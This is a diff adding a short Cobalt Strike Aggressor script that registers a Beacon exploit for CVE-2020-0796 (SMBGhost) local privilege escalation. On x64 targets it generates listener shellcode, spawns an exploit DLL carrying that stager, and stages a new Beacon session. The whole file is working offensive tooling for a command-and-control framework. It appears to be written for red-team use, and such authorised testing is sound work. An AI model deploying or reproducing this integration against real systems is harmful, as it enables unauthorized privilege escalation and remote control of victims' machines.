@@ -1,0 +1,16 @@
+sub CVE_2020_0796 {
+    btask($1, "Task Beacon to run " . listener_describe($2) . " via CVE-2020-0796");
+    
+    if (-is64 $1)
+    {
+        $arch = "x64";
+        $dll = "CVE_2020_0796.x64.dll";
+        $stager = shellcode($2, false, $arch);
+
+        bdllspawn!($1, script_resource($dll), $stager, "Elevation of local privileges", 5000);
+    
+        bstage($1, $null, $2, $arch);
+    } 
+}
+
+beacon_exploit_register("CVE_2020_0796", "CVE-2020-0796", &CVE_2020_0796);
